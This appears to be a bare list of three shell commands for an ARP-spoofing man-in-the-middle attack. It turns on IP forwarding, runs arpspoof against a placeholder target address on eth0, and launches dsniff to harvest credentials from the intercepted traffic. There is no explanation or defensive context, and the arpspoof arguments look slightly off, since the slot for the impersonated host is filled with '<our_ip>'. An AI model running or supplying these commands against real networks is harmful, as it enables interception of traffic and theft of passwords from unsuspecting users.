sysctl -w net.ipv4.ip_forward=1
arpspoof -i eth0 -t <target_ip> <our_ip>
dsniff
